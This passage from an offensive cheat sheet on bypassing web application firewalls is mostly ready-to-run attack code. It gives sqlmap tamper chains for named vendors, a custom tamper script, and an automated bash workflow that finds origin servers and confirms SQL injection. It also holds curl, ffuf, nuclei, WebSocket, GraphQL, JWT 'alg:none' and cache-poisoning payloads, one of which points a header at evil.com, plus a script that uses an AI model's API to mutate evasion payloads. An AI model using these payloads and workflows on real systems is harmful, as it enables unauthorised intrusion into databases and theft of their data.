charunicodeencode.py   → Unicode-encode non-encoded chars (%u00XX format)
charunicodeescape.py   → Unicode-escape non-encoded chars (\uXXXX format)
commalesslimit.py      → Replace LIMIT M,N with LIMIT N OFFSET M
commalessmid.py        → Replace MID(a,b,c) with MID(a FROM b FOR c)
commentbeforeparentheses.py → Add /**/ before each (
concat2concatws.py     → CONCAT(a,b) → CONCAT_WS(MID(@@version,0,0),a,b)
equaltolike.py         → Replace = with LIKE
escapequotes.py        → Escape ' and " with backslash
greatest.py            → Replace > with GREATEST
halfversionedmorekeywords.py → Add versioned MySQL comment before each keyword
htmlencode.py          → HTML encode all non-alphanumeric chars
ifnull2ifisnull.py     → IFNULL(a,b) → IF(ISNULL(a),b,a)
informationschemacomment.py → Add /**/ after information_schema.
least.py               → Replace > with LEAST
lowercase.py           → Lowercase all keywords
modsecurityversioned.py → Enclose keywords in versioned comment
modsecurityzeroversioned.py → Enclose keywords in zero-version comment /*!0...*/
multiplespaces.py      → Add multiple spaces around keywords
nonrecursivereplacement.py → Replace keywords with non-recursive substitutions
overlongutf8.py        → Convert all chars to overlong UTF-8 (non-critical chars)
overlongutf8more.py    → Convert all chars including critical ones
percentage.py          → Add % before each char (ASP bypass)
plus2concat.py         → + → CONCAT() for MSSQL
plus2fnconcat.py       → + → fn+CONCAT() with ODBC syntax
randomcase.py          → Random upper/lower case
randomcomments.py      → Insert random comments between keywords
securesphere.py        → Append special crafted string to bypass SecureSphere
sp_password.py         → Append sp_password to payload to obscure in MSSQL logs
space2comment.py       → Replace space with /**/
space2dash.py          → Replace space with --\n
space2hash.py          → Replace space with #\n (MySQL only)
space2morehash.py      → Replace space with #\n## (MySQL only)
space2mssqlblank.py    → Replace space with random blank char (MSSQL)
space2mssqlhash.py     → Replace space with %23%0A (MSSQL)
space2mysqlblank.py    → Replace space with random blank char (MySQL)
space2mysqldash.py     → Replace space with -- \n
space2plus.py          → Replace space with +
space2randomblank.py   → Replace space with random blank char
symboliclogical.py     → Replace AND/OR with && and ||
unionalltounion.py     → UNION ALL SELECT → UNION SELECT
unmagicquotes.py       → Replace ' with %bf%27 (wide char injection)
uppercase.py           → Uppercase all keywords
varnish.py             → Add X-originating-IP header
versionedkeywords.py   → Enclose non-function keywords in versioned comment
versionedmorekeywords.py → Enclose all keywords in versioned comment
xforwardedfor.py       → Add random X-Forwarded-For header
```

**Tamper Chain Per WAF Vendor**
```bash
# Cloudflare
sqlmap -u "https://TARGET/?id=1" \
  --tamper="space2comment,randomcase,charunicodeencode" \
  --level=5 --risk=3 --dbms=mysql

# ModSecurity CRS
sqlmap -u "https://TARGET/?id=1" \
  --tamper="modsecurityversioned,space2comment,randomcomments,between" \
  --level=5 --risk=3

# AWS WAF
sqlmap -u "https://TARGET/?id=1" \
  --tamper="randomcase,space2mysqlblank,charencode" \
  --level=5 --risk=3

# Imperva
sqlmap -u "https://TARGET/?id=1" \
  --tamper="securesphere,space2comment,charunicodeencode" \
  --level=5 --risk=3 --random-agent

# F5 BIG-IP
sqlmap -u "https://TARGET/?id=1" \
  --tamper="versionedkeywords,space2comment,multiplespaces" \
  --level=5 --risk=3

# Akamai
sqlmap -u "https://TARGET/?id=1" \
  --tamper="charunicodeencode,space2comment,randomcase,appendnullbyte" \
  --level=5 --risk=3
```

**Custom Tamper Script Template**
```python
#!/usr/bin/env python3
# custom_bypass.py — template for WAF-specific tamper script
# Place in sqlmap/tamper/ directory

from lib.core.enums import PRIORITY

__priority__ = PRIORITY.NORMAL

def dependencies():
    pass

def tamper(payload, **kwargs):
    """
    Applies multi-layer obfuscation:
    1. Replaces spaces with /**/ comments
    2. URL-encodes special chars in hex
    3. Randomly cases SQL keywords
    4. Injects MySQL version comments around keywords

    Tested against: ModSecurity CRS PL2, Cloudflare Free
    """
    import re, random

    if payload is None:
        return payload

    KEYWORDS = ['SELECT', 'UNION', 'FROM', 'WHERE', 'AND', 'OR',
                'INSERT', 'UPDATE', 'DELETE', 'DROP', 'TABLE',
                'ORDER', 'BY', 'GROUP', 'HAVING', 'LIMIT', 'OFFSET']

    result = payload

    # Step 1: Version-comment wrap keywords
    for kw in KEYWORDS:
        pattern = re.compile(re.escape(kw), re.IGNORECASE)
        result = pattern.sub(f'/*!50000{kw}*/', result)

    # Step 2: Replace spaces with random whitespace equivalent
    whitespace = ['/**/', '%09', '%0a', '%0d']
    result = result.replace(' ', random.choice(whitespace))

    # Step 3: Random case remaining keywords
    def rand_case(match):
        word = match.group(0)
        return ''.join(c.upper() if random.random() > 0.5 else c.lower()
                      for c in word)

    result = re.sub(r'[a-zA-Z]+', rand_case, result)

    return result
```

**sqlmap Flags for WAF Bypass**
```bash
sqlmap -u "https://TARGET/?id=1" \
  --level=5 \           # Max test depth (1-5)
  --risk=3 \            # Max risk level (1-3)
  --technique=BEUSTQ \  # All techniques: Boolean, Error, Union, Stacked, Time, Query
  --dbms=mysql \        # Skip DB fingerprinting overhead
  --random-agent \      # Random User-Agent
  --delay=2 \           # Delay between requests (evasion)
  --timeout=30 \
  --retries=3 \
  --skip-urlencode \    # Don't double-encode
  --no-cast \           # Disable CHAR casting (triggers some WAF rules)
  --hex \               # Use hex encoding
  --prefix="'" \        # Custom prefix
  --suffix="--+" \      # Custom suffix
  --tamper="space2comment,randomcase" \
  --proxy="http://127.0.0.1:8080" \  # Route through Burp
  --threads=1           # Single thread for stealth
```

### 12.2 ffuf WAF Bypass Configuration

```bash
# Standard ffuf with WAF bypass headers
ffuf -u "https://TARGET/FUZZ" \
  -w /usr/share/seclists/Discovery/Web-Content/common.txt \
  -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" \
  -H "X-Forwarded-For: 127.0.0.1" \
  -H "X-Real-IP: 127.0.0.1" \
  -mc 200,204,301,302,307,401,403 \
  -fc 429 \              # Filter rate-limit responses
  -p 0.1-0.5 \           # Random delay 100-500ms (evasion)
  -rate 50 \             # Max 50 req/sec
  -t 10

# POST parameter fuzzing
ffuf -u "https://TARGET/api/search" \
  -X POST \
  -H "Content-Type: application/json" \
  -d '{"query":"FUZZ"}' \
  -w payloads/sqli.txt \
  -H "User-Agent: Mozilla/5.0" \
  -mc all \
  -fc 403,429

# Custom header injection for WAF bypass testing
ffuf -u "https://TARGET/admin" \
  -H "FUZZ: 127.0.0.1" \
  -w headers_that_bypass.txt \
  -mc 200 \
  -v
```

### 12.3 nuclei WAF Bypass Templates

```yaml
# Custom nuclei template for WAF fingerprinting
id: waf-fingerprint-advanced

info:
  name: Advanced WAF Fingerprinting
  author: pi
  severity: info
  tags: waf,fingerprint

requests:
  - raw:
      - |
        GET /?id=1'%20OR%20'1'='1 HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0
        Accept: */*

    matchers-condition: or
    matchers:
      - type: word
        words:
          - "cloudflare"
          - "Sorry, you have been blocked"
        part: body
        name: cloudflare

      - type: word
        words:
          - "FORTIWAFSID"
        part: header
        name: fortiweb

      - type: word
        words:
          - "visid_incap"
          - "nlbi_"
        part: header
        name: imperva

      - type: status
        status:
          - 403
        name: generic-block
```

```yaml
# nuclei template with WAF bypass headers built in
id: sqli-waf-bypass

info:
  name: SQLi with WAF Bypass Headers
  author: pi
  severity: high
  tags: sqli,waf-bypass

requests:
  - method: GET
    path:
      - "{{BaseURL}}/?id=1'/**/UNION/**/SELECT/**/1,2,@@version--+-"
      - "{{BaseURL}}/?id=1'%23%0aUNION%23%0aSELECT%23%0a1,2,@@version--"
      - "{{BaseURL}}/?id=1'/*!50000UNION*//*!50000SELECT*/1,2,@@version--+-"

    headers:
      X-Forwarded-For: "127.0.0.1"
      X-Real-IP: "127.0.0.1"
      User-Agent: "Mozilla/5.0 (compatible; Googlebot/2.1)"

    matchers:
      - type: regex
        regex:
          - "([0-9]+\\.[0-9]+\\.[0-9]+-[Mm]ari[aA]|[0-9]+\\.[0-9]+\\.[0-9]+-[Mm]y[Ss][Qq][Ll])"
```

### 12.4 curl WAF Bypass One-Liners

```bash
# Test with all common bypass headers
curl -sk "https://TARGET/?id=1'OR'1'='1" \
  -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36" \
  -H "X-Forwarded-For: 127.0.0.1" \
  -H "X-Real-IP: 127.0.0.1" \
  -H "Accept-Language: en-US,en;q=0.9" \
  -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" \
  -H "Referer: https://www.google.com/"

# Chunked transfer encoding
curl -sk "https://TARGET/search" \
  -X POST \
  -H "Transfer-Encoding: chunked" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-urlencode "q=1' UNION SELECT 1,2,3--"

# Multipart bypass
curl -sk "https://TARGET/upload" \
  -F "file=@/dev/null" \
  -F "q=1' UNION SELECT 1,2,3--"

# JSON with unicode bypass
curl -sk "https://TARGET/api" \
  -X POST \
  -H "Content-Type: application/json" \
  -d '{"q":"\u0031\u0027\u0020\u004f\u0052\u0020\u0031\u003d\u0031\u002d\u002d"}'

# HTTP/2 with curl
curl -sk --http2 "https://TARGET/?id=1'OR'1'='1" \
  -H "User-Agent: Mozilla/5.0"

# Test origin IP directly
curl -sk "https://ORIGIN_IP/?id=1'OR'1'='1" \
  --insecure \
  -H "Host: TARGET.COM"
```

---

## 13. AUTOMATED WAF BYPASS WORKFLOW

```bash
#!/usr/bin/env bash
# waf_bypass_auto.sh — Automated WAF bypass testing workflow
# Usage: ./waf_bypass_auto.sh TARGET.COM
# Authorized testing only

TARGET="${1:-TARGET.COM}"
WORKSPACE="/tmp/waf_bypass_$(date +%s)_${TARGET//[^a-zA-Z0-9]/_}"
mkdir -p "$WORKSPACE"/{fingerprint,origin,bypass,results}

log() { echo "[$(date +%H:%M:%S)] $*" | tee -a "$WORKSPACE/continuous.md"; }

# ── STEP 1: DETECT WAF PRESENCE ─────────────────────────────────────────────
log "=== STEP 1: WAF Detection ==="

BASELINE=$(curl -sk -o /dev/null -w "%{http_code}" "https://${TARGET}/")
SQLI_CODE=$(curl -sk -o /dev/null -w "%{http_code}" "https://${TARGET}/?id=1%27OR%271%27%3D%271")
XSS_CODE=$(curl -sk -o /dev/null -w "%{http_code}" "https://${TARGET}/?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E")
LFI_CODE=$(curl -sk -o /dev/null -w "%{http_code}" "https://${TARGET}/?file=../../etc/passwd")

log "Baseline: $BASELINE | SQLi: $SQLI_CODE | XSS: $XSS_CODE | LFI: $LFI_CODE"

if [ "$SQLI_CODE" = "403" ] || [ "$XSS_CODE" = "403" ] || [ "$LFI_CODE" = "403" ]; then
  WAF_PRESENT=true
  log "[+] WAF DETECTED (blocking attack patterns)"
else
  WAF_PRESENT=false
  log "[-] No WAF detected — proceeding directly to exploitation"
fi

# ── STEP 2: FINGERPRINT VENDOR ───────────────────────────────────────────────
log "=== STEP 2: WAF Fingerprinting ==="

HEADERS=$(curl -ski "https://${TARGET}/?id=1%27" 2>&1)
echo "$HEADERS" > "$WORKSPACE/fingerprint/headers.txt"

# Score each vendor
SCORE_CF=0; SCORE_AWS=0; SCORE_IMP=0; SCORE_AKAMAI=0; SCORE_MODSEC=0

echo "$HEADERS" | grep -qi "cloudflare" && SCORE_CF=$((SCORE_CF+30))
echo "$HEADERS" | grep -qi "cf_clearance\|__cfduid" && SCORE_CF=$((SCORE_CF+20))
echo "$HEADERS" | grep -qi "X-Amzn-RequestId\|x-amz-cf-id" && SCORE_AWS=$((SCORE_AWS+25))
echo "$HEADERS" | grep -qi "visid_incap\|nlbi_\|X-Iinfo" && SCORE_IMP=$((SCORE_IMP+30))
echo "$HEADERS" | grep -qi "AkamaiGHost\|ak_bmsc\|bm_sv" && SCORE_AKAMAI=$((SCORE_AKAMAI+30))
echo "$HEADERS" | grep -qi "406 Not Acceptable\|Mod_Security\|NOYB" && SCORE_MODSEC=$((SCORE_MODSEC+25))

# Check block page body
BODY=$(curl -sk "https://${TARGET}/?id=1%27OR%271%27%3D%271")
echo "$BODY" | grep -qi "cloudflare\|been blocked" && SCORE_CF=$((SCORE_CF+30))
echo "$BODY" | grep -qi "incapsula\|Error 16" && SCORE_IMP=$((SCORE_IMP+30))

log "Scores — Cloudflare:$SCORE_CF AWS:$SCORE_AWS Imperva:$SCORE_IMP Akamai:$SCORE_AKAMAI ModSec:$SCORE_MODSEC"

# Identify top vendor
VENDOR="Unknown"
MAX=0
for V_SCORE in "Cloudflare:$SCORE_CF" "AWS:$SCORE_AWS" "Imperva:$SCORE_IMP" "Akamai:$SCORE_AKAMAI" "ModSecurity:$SCORE_MODSEC"; do
  V="${V_SCORE%%:*}"; S="${V_SCORE##*:}"
  [ "$S" -gt "$MAX" ] && MAX="$S" && VENDOR="$V"
done
log "[+] Detected WAF vendor: $VENDOR (confidence: $MAX/100)"

# ── STEP 3: ORIGIN IP DISCOVERY ─────────────────────────────────────────────
log "=== STEP 3: Origin IP Discovery ==="

ORIGIN_IPS=()

# Method 1: Historical DNS
log "Checking SecurityTrails..."
ST_IPS=$(curl -s "https://api.securitytrails.com/v1/history/${TARGET}/dns/a" \
  -H "APIKEY: ${SECURITYTRAILS_KEY:-''}" 2>/dev/null | jq -r '.records[].values[].ip' 2>/dev/null)
[ -n "$ST_IPS" ] && ORIGIN_IPS+=($ST_IPS) && log "SecurityTrails: $ST_IPS"

# Method 2: Certificate transparency
log "Checking crt.sh..."
CT_SUBS=$(curl -s "https://crt.sh/?q=%.${TARGET}&output=json" 2>/dev/null | \
  jq -r '.[].name_value' 2>/dev/null | sed 's/\*\.//g' | sort -u)
for sub in $CT_SUBS; do
  IP=$(dig +short "$sub" 2>/dev/null | grep -E '^[0-9]+\.' | head -1)
  if [ -n "$IP" ]; then
    CF_CHECK=$(echo "$IP" | grep -cE "^(104\.|172\.(6[4-9]|7[0-9]|8[01])\.|162\.158\.|198\.41\.)" || true)
    [ "$CF_CHECK" = "0" ] && ORIGIN_IPS+=("$IP") && log "Non-CDN IP via subdomain $sub: $IP"
  fi
done

# Method 3: Common direct-access subdomains
for SUB in direct origin backend server api-origin mail smtp; do
  IP=$(dig +short "${SUB}.${TARGET}" 2>/dev/null | grep -E '^[0-9]+\.' | head -1)
  [ -n "$IP" ] && ORIGIN_IPS+=("$IP") && log "Direct subdomain ${SUB}: $IP"
done

# Deduplicate and test
UNIQUE_IPS=($(printf '%s\n' "${ORIGIN_IPS[@]}" | sort -u))
log "Testing ${#UNIQUE_IPS[@]} candidate origin IPs..."

for IP in "${UNIQUE_IPS[@]}"; do
  CODE=$(curl -sk --connect-timeout 5 -o /dev/null -w "%{http_code}" \
    "http://${IP}/" -H "Host: ${TARGET}" 2>/dev/null)
  if [ "$CODE" != "000" ]; then
    log "[ORIGIN CANDIDATE] $IP → HTTP $CODE"
    # Test if WAF bypass works against this IP
    BYPASS_CODE=$(curl -sk --connect-timeout 5 -o /dev/null -w "%{http_code}" \
      "http://${IP}/?id=1'OR'1'='1" -H "Host: ${TARGET}" 2>/dev/null)
    log "  Attack probe against $IP: HTTP $BYPASS_CODE"
    [ "$BYPASS_CODE" != "403" ] && log "  [!!!] ORIGIN BYPASS CONFIRMED: $IP" && \
      echo "$IP" >> "$WORKSPACE/origin/confirmed_origins.txt"
  fi
done

# ── STEP 4: PAYLOAD BYPASS TESTING ──────────────────────────────────────────
log "=== STEP 4: Payload Bypass Testing ==="

# Build bypass payload list based on detected vendor
case "$VENDOR" in
  Cloudflare)
    PAYLOADS=(
      "1'/*!50000UNION*//*!50000SELECT*/1,2,@@version--+-"
      "1'%23%0aUNION%23%0aSELECT%23%0a1,2,@@version--"
      "1'%0aUNION%0aSELECT%0a1,2,@@version--+-"
    );;
  AWS)
    PAYLOADS=(
      "1' UNION%0aSELECT%0a1,2,@@version--+-"
      "1'/**/UNION/**/SELECT/**/1,2,@@version--+-"
      "1' uNiOn SeLeCt 1,2,@@VERSION--+-"
    );;
  ModSecurity)
    PAYLOADS=(
      "1'/*!UNION*//*!SELECT*/1,2,@@version--+-"
      "1'%09UNION%09SELECT%091,2,@@version--+-"
      "1'%0bUNION%0bSELECT%0b1,2,@@version--+-"
    );;
  *)
    PAYLOADS=(
      "1'/*!50000UNION*//*!50000SELECT*/1,2,@@version--+-"
      "1'%23%0aUNION%23%0aSELECT%23%0a1,2,@@version--"
      "1'/**/UNION/**/SELECT/**/1,2,@@version--+-"
      "1'%09UNION%09SELECT%091,2,@@version--"
      "1'%0aUNION%0aSELECT%0a1,user(),3--"
    );;
esac

BYPASS_HEADERS=(
  "X-Forwarded-For: 127.0.0.1"
  "X-Real-IP: 127.0.0.1"
  "X-Originating-IP: 127.0.0.1"
  "True-Client-IP: 127.0.0.1"
)

for PAYLOAD in "${PAYLOADS[@]}"; do
  ENC_PAYLOAD=$(python3 -c "import urllib.parse; print(urllib.parse.quote('${PAYLOAD}', safe=''))" 2>/dev/null || echo "$PAYLOAD")
  
  # Test without bypass headers
  CODE1=$(curl -sk -o /dev/null -w "%{http_code}" "https://${TARGET}/?id=${ENC_PAYLOAD}")
  
  # Test with IP spoofing headers
  CODE2=$(curl -sk -o /dev/null -w "%{http_code}" "https://${TARGET}/?id=${ENC_PAYLOAD}" \
    -H "X-Forwarded-For: 127.0.0.1" -H "X-Real-IP: 127.0.0.1")
  
  log "Payload [${CODE1}→${CODE2}]: ${PAYLOAD:0:60}"
  [ "$CODE1" != "403" ] && echo "BYPASS: $PAYLOAD" >> "$WORKSPACE/bypass/working_payloads.txt"
done

# ── STEP 5: VALIDATE BYPASS ──────────────────────────────────────────────────
log "=== STEP 5: Validating Bypasses ==="

if [ -s "$WORKSPACE/bypass/working_payloads.txt" ]; then
  log "[+] Working bypass payloads found!"
  cat "$WORKSPACE/bypass/working_payloads.txt"
  
  # Try to get actual SQLi output
  while IFS= read -r PAYLOAD; do
    RESPONSE=$(curl -sk "https://${TARGET}/?id=${PAYLOAD}")
    VERSION=$(echo "$RESPONSE" | grep -oE '[0-9]+\.[0-9]+\.[0-9]+-[A-Za-z]+')
    [ -n "$VERSION" ] && log "[!!!] SQL INJECTION CONFIRMED — DB Version: $VERSION"
  done < "$WORKSPACE/bypass/working_payloads.txt"
fi

log "=== WORKFLOW COMPLETE ==="
log "Results saved to: $WORKSPACE"
ls -la "$WORKSPACE/"*/
```

---

## 14. 2024-2025 CUTTING EDGE TECHNIQUES

### 14.1 LLM-Powered WAF Bypass

```python
#!/usr/bin/env python3
# Use Claude/GPT API to mutate payloads that bypass ML-based WAFs

import anthropic
import requests

client = anthropic.Anthropic()

def mutate_payload_with_llm(original_payload: str, waf_vendor: str, vuln_type: str) -> list[str]:
    """Generate WAF-evading payload variants using Claude."""
    
    message = client.messages.create(
        model="claude-opus-4-5",
        max_tokens=2048,
        messages=[{
            "role": "user",
            "content": f"""You are a payload mutation engine for authorized penetration testing.
            
Mutate this {vuln_type} payload to evade {waf_vendor} WAF signatures.
Generate 10 distinct variants using different obfuscation techniques.

Original payload: {original_payload}

For each variant, use a different technique:
- Comment injection
- Case variation  
- Encoding (URL, Unicode, hex)
- Whitespace substitution
- Function equivalents
- String fragmentation
- Null byte injection
- Version comments (for MySQL)

Return ONLY the payload variants, one per line, no explanations."""
        }]
    )
    
    variants = message.content[0].text.strip().split('\n')
    return [v.strip() for v in variants if v.strip()]

def test_payloads(target: str, param: str, payloads: list[str]) -> list[str]:
    """Test each payload variant and return those that bypass WAF."""
    working = []
    for payload in payloads:
        try:
            r = requests.get(target, params={param: payload}, timeout=10, verify=False)
            if r.status_code != 403 and r.status_code != 429:
                working.append(payload)
                print(f"[BYPASS] {payload[:80]} → HTTP {r.status_code}")
        except Exception as e:
            pass
    return working

# Example usage
original = "' UNION SELECT 1,user(),3--"
variants = mutate_payload_with_llm(original, "Cloudflare", "SQLi")
working = test_payloads("https://TARGET.COM/search", "q", variants)
```

### 14.2 ML Model Confusion Attacks on AI-Based WAFs

```python
# AI WAFs use ML classifiers — attack the classifier itself
# Techniques: adversarial examples, feature poisoning, evasion

# Technique 1: Add benign context to confuse classifier score
# Classifier sees "SELECT" and scores high — dilute with legitimate SQL terms
malicious = "' UNION SELECT username,password FROM users--"
# Wrap with benign SQL-like content that lowers anomaly score
confused = f"1 ORDER BY 1 HAVING 1=1 GROUP BY 1 {malicious} LIMIT 1 OFFSET 0"

# Technique 2: Semantic similarity attack
# WAF trained on known payloads — use uncommon but equivalent syntax
# Instead of: SELECT
# Use MySQL-specific: TABLE (MySQL 8.0+)
# TABLE users → equivalent to SELECT * FROM users in MySQL 8.0+
alt_payload = "1 UNION TABLE information_schema.tables LIMIT 3--"

# Technique 3: Feature vector manipulation
# ML WAFs extract features (token count, special char ratio, etc.)
# Add padding to normalize feature vector to benign range
import random, string
padding = ''.join(random.choices(string.ascii_lowercase, k=500))
payload_with_padding = f"q={padding}&id=1'OR'1'='1"

# Technique 4: Context window overflow
# Some AI WAFs only inspect first N characters
large_prefix = "a" * 8192
bypass = large_prefix + "' UNION SELECT 1,2,3--"
```

### 14.3 HTTP/3 QUIC Protocol WAF Bypass

```bash
# Many WAFs don't inspect HTTP/3 traffic properly yet (2024)
# curl with HTTP/3 support (requires --with-ngtcp2 build)

curl --http3 "https://TARGET/?id=1'OR'1'='1" \
  -H "User-Agent: Mozilla/5.0" \
  -v

# Test if HTTP/3 bypasses WAF
# Compare responses: HTTP/1.1 vs HTTP/3
HTTP1_CODE=$(curl --http1.1 -sk -o /dev/null -w "%{http_code}" "https://TARGET/?id=1%27OR%271%27%3D%271")
HTTP3_CODE=$(curl --http3 -sk -o /dev/null -w "%{http_code}" "https://TARGET/?id=1%27OR%271%27%3D%271" 2>/dev/null || echo "N/A")
echo "HTTP/1.1: $HTTP1_CODE | HTTP/3: $HTTP3_CODE"

# quiche-based HTTP/3 client
# https://github.com/cloudflare/quiche
./quiche-client "https://TARGET/?id=1'OR'1'='1"
```

### 14.4 JSON Smuggling Bypass

```bash
# Nested JSON structures confuse WAF parsers
# WAF parses outer JSON, app parses inner differently

# Double JSON encoding
curl -X POST "https://TARGET/api" \
  -H "Content-Type: application/json" \
  -d '{"data":"{\"query\":\"1 UNION SELECT 1,2,3--\"}"}'

# JSON with comments (non-standard but some parsers accept)
curl -X POST "https://TARGET/api" \
  -H "Content-Type: application/json" \
  -d '{"query": /* benign comment */ "1 UNION SELECT 1,2,3--"}'

# JSON with trailing data
curl -X POST "https://TARGET/api" \
  -H "Content-Type: application/json" \
  -d '{"query":"safe"}{"query":"1 UNION SELECT 1,2,3--"}'

# Null bytes in JSON keys (some parsers truncate at null)
curl -X POST "https://TARGET/api" \
  -H "Content-Type: application/json" \
  -d "{\"quer\x00y\":\"1 UNION SELECT 1,2,3--\"}"

# Unicode JSON key confusion
curl -X POST "https://TARGET/api" \
  -H "Content-Type: application/json" \
  -d '{"quer\u0079":"1 UNION SELECT 1,2,3--"}'
```

### 14.5 GraphQL WAF Bypass

```bash
# GraphQL often gets less WAF scrutiny than REST

# Aliases to exfiltrate same field multiple times
curl -X POST "https://TARGET/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query":"{ a: user(id:\"1 OR 1=1\") { username } b: user(id:\"1\") { email } }"}'

# Introspection (if not disabled — reveals entire schema)
curl -X POST "https://TARGET/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { types { name fields { name } } } }"}'

# Field suggestions (leaks schema via error messages)
curl -X POST "https://TARGET/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query":"{ usr { name } }"}'

# Batching attack (rate limit bypass)
curl -X POST "https://TARGET/graphql" \
  -H "Content-Type: application/json" \
  -d '[
    {"query":"mutation { login(user:\"admin\",pass:\"pass1\") }"},
    {"query":"mutation { login(user:\"admin\",pass:\"pass2\") }"},
    {"query":"mutation { login(user:\"admin\",pass:\"pass3\") }"}
  ]'

# Fragment injection
curl -X POST "https://TARGET/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query":"fragment f on User { id username password } { user(id:1) { ...f } }"}'
```

### 14.6 WebSocket WAF Bypass

```python
import websocket
import json

# WebSocket connections often bypass HTTP WAF inspection
# Most WAFs inspect HTTP upgrade but not WebSocket frames

def ws_sqli_bypass(target_ws_url: str, payload: str):
    """Send SQLi payload over WebSocket to bypass HTTP WAF."""
    
    ws = websocket.create_connection(
        target_ws_url,
        header={
            "User-Agent": "Mozilla/5.0",
            "Origin": "https://TARGET.COM"
        }
    )
    
    # Send attack payload as WebSocket message
    ws.send(json.dumps({"query": payload, "type": "search"}))
    result = ws.recv()
    ws.close()
    return result

# Test SQLi via WebSocket
result = ws_sqli_bypass(
    "wss://TARGET.COM/ws",
    "1' UNION SELECT 1,user(),3--"
)
print(result)
```

```bash
# wscat for WebSocket testing
wscat -c "wss://TARGET.COM/ws" \
  -H "Origin: https://TARGET.COM" \
  --execute '{"query":"1'"'"' UNION SELECT 1,2,3--"}'

# websocat (more control)
echo '{"id":"1'"'"' OR '"'"'1'"'"'='"'"'1"}' | \
  websocat "wss://TARGET.COM/ws" \
  --header "Origin: https://TARGET.COM"
```

### 14.7 Prototype Pollution WAF Bypass

```javascript
// Prototype pollution can affect WAF client-side filtering
// Or pollute server-side objects used in WAF bypass checks

// Classic PP payload in GET parameter
// ?__proto__[admin]=true
// ?constructor[prototype][isAdmin]=true

// PP to bypass server-side WAF logic written in Node.js
// If WAF checks: if (req.body.blocked) { block(); }
// Pollute: {"__proto__":{"blocked":false}, "payload":"<script>alert(1)</script>"}

curl -X POST "https://TARGET/api" \
  -H "Content-Type: application/json" \
  -d '{"__proto__":{"blocked":false,"allowed":true},"data":"<script>alert(1)</script>"}'

// PP via URL query string
curl "https://TARGET/?__proto__[blocked]=false&q=<script>alert(1)</script>"
curl "https://TARGET/?constructor%5Bprototype%5D%5Ballowed%5D=1&q=<script>alert(1)</script>"
```

### 14.8 Cache Poisoning to Bypass WAF

```bash
# Poison cache with unblocked response, serve payload to subsequent users
# Web Cache Deception variant

# Step 1: Find cacheable endpoint
# Step 2: Inject payload in non-inspected header that gets cached
curl -sk "https://TARGET/api/user" \
  -H "X-Forwarded-Host: evil.com" \
  -H "X-Forwarded-Scheme: http" \
  -H "Cache-Control: max-age=3600"

# Param cloaking — WAF sees different params than cache key
# Cache key: /page?lang=en
# WAF inspects: /page?lang=en&xss=<script>alert(1)</script>
# Cache stores response for /page?lang=en WITH xss payload executed

curl "https://TARGET/page?lang=en&utm_content=<script>alert(1)</script>"

# Fat GET (body in GET request confuses WAF, body gets cached)
curl -X GET "https://TARGET/api/search" \
  -H "Content-Type: application/json" \
  -d '{"q":"<script>alert(1)</script>"}'
```

### 14.9 JWT Header Injection WAF Bypass

```bash
# JWTs in Authorization header often bypass content-inspection WAFs
# WAF focuses on GET/POST params, not JWT claims

# Create malicious JWT with SQLi in claims (no signature verification)
python3 -c "
import base64, json

header = base64.b64encode(json.dumps({'alg':'none','typ':'JWT'}).encode()).rstrip(b'=').decode()
payload = base64.b64encode(json.dumps({
    'sub': \"1' UNION SELECT 1,user(),3--\",
    'role': '<script>alert(1)</script>',
    'iat': 9999999999
}).encode()).rstrip(b'=').decode()
print(f'{header}.{payload}.')
"

# Use with curl
TOKEN="eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxJyBVTklPTiBTRUxFQ1QgMSx1c2VyKCksMy0tIiwicm9sZSI6IjxzY3JpcHQ+YWxlcnQoMSk8L3NjcmlwdD4iLCJpYXQiOjk5OTk5OTk5OTl9."
curl -sk "https://TARGET/api/profile" \
  -H "Authorization: Bearer $TOKEN"
```

### 14.10 gRPC WAF Bypass

```bash
# gRPC uses HTTP/2 with Protocol Buffers — most WAFs don't inspect protobuf
# grpcurl for testing

# List gRPC services
grpcurl -plaintext TARGET:50051 list

# Invoke with SQLi payload in string field
grpcurl -plaintext -d '{"query":"1'"'"' UNION SELECT 1,2,3--"}' \
  TARGET:50051 search.SearchService/Search

# grpc-gateway REST transcoding bypass
# gRPC-Gateway translates REST→gRPC; attack the REST interface
curl -X POST "https://TARGET/v1/search" \
  -H "Content-Type: application/json" \
  -d '{"query":"1'"'"' UNION SELECT 1,2,3--"}'
```

---

## 15. WAF BYPASS DECISION TREE

```
TARGET HAS WAF
      │
      ▼
┌─────────────────────────────────────────────────────┐
│ STEP 1: Confirm WAF Presence                        │
│ Send: ' OR '1'='1, <script>, ../../../etc/passwd    │
│ Get 403/406/429/503? → WAF Present                  │
└─────────────────────────────────────────────────────┘
      │ YES                              │ NO
      ▼                                  ▼
┌─────────────────┐              ┌───────────────────┐
│ STEP 2:         │              │ Direct            │
│ Fingerprint     │              │ Exploitation →    │
│ Vendor          │              │ No bypass needed  │
└─────────────────┘              └───────────────────┘
      │
      ├─ Cloudflare ──────────────────────────────────────┐
      ├─ AWS WAF ─────────────────────────────────────────┤
      ├─ Akamai ──────────────────────────────────────────┤
      ├─ Imperva ─────────────────────────────────────────┤
      ├─ ModSecurity ─────────────────────────────────────┤
      ├─ F5 BIG-IP ───────────────────────────────────────┤
      └─ Unknown ─────────────────────────────────────────┘
      │
      ▼
┌─────────────────────────────────────────────────────┐
│ STEP 3: Origin IP Discovery                         │
│ Try all 12 methods in parallel                      │
└─────────────────────────────────────────────────────┘
      │
      ├─ Found origin IP? ──── YES ──→ Direct probe origin
      │                                      │
      │                              WAF bypassed via IP?
      │                                 YES → Exploit direct
      │                                 NO  → Continue
      │
      ▼ NO (use WAF bypass techniques)
┌─────────────────────────────────────────────────────┐
│ STEP 4: HTTP-Level Bypass Attempts                  │
│ Try in order:                                       │
│ 4a. IP spoofing headers (X-Forwarded-For: 127.0.0.1)│
│ 4b. Method override (X-HTTP-Method-Override)        │
